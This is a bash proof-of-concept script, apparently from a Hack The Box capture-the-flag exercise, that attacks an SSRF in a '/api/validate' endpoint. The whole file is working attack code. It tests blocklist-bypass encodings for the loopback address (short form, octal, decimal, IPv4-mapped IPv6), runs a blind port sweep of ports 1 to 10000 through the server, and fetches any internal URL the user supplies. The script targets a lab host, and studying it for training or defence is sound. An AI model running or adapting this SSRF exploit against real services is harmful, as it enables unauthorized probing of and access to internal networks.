#!/usr/bin/env bash
# Cohort (HTB) - /api/validate SSRF blocklist bypass + loopback port sweep.
# Source write-up: cohort.txt
#
# Usage:
#   ./poc_htb_cohort_ssrf.sh bypass            # test the encodings
#   ./poc_htb_cohort_ssrf.sh sweep             # 1-10000 blind sweep
#   ./poc_htb_cohort_ssrf.sh fetch http://127.1:8888/api/version
set -u
BASE="${BASE:-https://cohort.htb}"

post() {
  curl -sk --max-time "${2:-8}" -X POST "$BASE/api/validate" \
    -H 'Content-Type: application/json' -d "{\"url\":\"$1\"}"
}

case "${1:-bypass}" in
  bypass)
    post "https://example.com/"            ; echo
    echo "[blocked?]"; post "http://127.0.0.1/" ; echo
    echo "[blocked?]"; post "http://localhost/" ; echo
    echo "[127.1]";        post "http://127.1/"
    echo "[octal]";        post "http://0177.0.0.1/"
    echo "[decimal]";      post "http://2130706433/"
    echo "[v4-mapped v6]"; post "http://[::ffff:127.0.0.1]/"
    ;;
  sweep)
    for p in $(seq 1 10000); do
      out=$(post "http://127.1:$p/" 3)
      case "$out" in
        *"Connection refused"*) ;;
        *) echo "OPEN: $p  ${out:0:120}" ;;
      esac
    done
    ;;
  fetch)
    [ $# -ge 2 ] || { echo "usage: $0 fetch <url>"; exit 1; }
    post "$2" 20
    ;;
  *)
    echo "usage: $0 {bypass|sweep|fetch <url>}"; exit 1
    ;;
esac
